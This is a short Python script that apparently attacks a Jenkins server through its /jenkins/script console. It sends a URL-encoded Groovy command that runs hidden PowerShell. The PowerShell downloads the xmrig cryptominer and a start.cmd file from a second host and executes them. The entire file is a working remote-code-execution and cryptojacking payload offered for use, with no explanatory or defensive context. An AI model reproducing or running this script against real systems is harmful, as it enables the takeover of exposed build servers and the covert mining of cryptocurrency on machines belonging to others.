#!/usr/bin/env python
import requests
postdata='script=println%22powershell+-w+hidden+-nop+-c+Invoke-Expression+%28New-Object+Net.WebClient%29.DownloadFile%28%27http%3A%2F%2F192.168.88.145%2Fxmrig.exe%27%2C%27D%3A%5C%5Cxmrig.exe%27%29%3BInvoke-Expression+%28New-Object+Net.WebClient%29.DownloadFile%28%27http%3A%2F%2F192.168.88.145%2Fstart.cmd%27%2C%27D%3A%5C%5Cstart.cmd%27%29%3Bsleep+1%3Bstart-process+-filePath+D%3A%5C%5Cstart.cmd%22.execute%28%29.text&json=%7B%22script%22%3A+%22println%5C%22powershell+-w+hidden+-nop+-c+Invoke-Expression+%28New-Object+Net.WebClient%29.DownloadFile%28%27http%3A%2F%2F192.168.88.145%2Fxmrig.exe%27%2C%27D%3A%5C%5C%5C%5Cxmrig.exe%27%29%3BInvoke-Expression+%28New-Object+Net.WebClient%29.DownloadFile%28%27http%3A%2F%2F192.168.88.145%2Fstart.cmd%27%2C%27D%3A%5C%5C%5C%5Cstart.cmd%27%29%3Bsleep+1%3Bstart-process+-filePath+D%3A%5C%5C%5C%5Cstart.cmd%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&Submit=%E8%BF%90%E8%A1%8C'
url='http://192.168.88.41:8080/jenkins/script'
headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0',
         'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
         'Referer':'http://192.168.88.41:8080/jenkins/script',
         'Content-Type':'application/x-www-form-urlencoded',
         'Connection':'close'
         }
try:
    resp=requests.post(url,data=postdata,headers=headers)
    resp.text
    
except Exception:
    print"Failed!"
    
finally:
    print 'successfully!'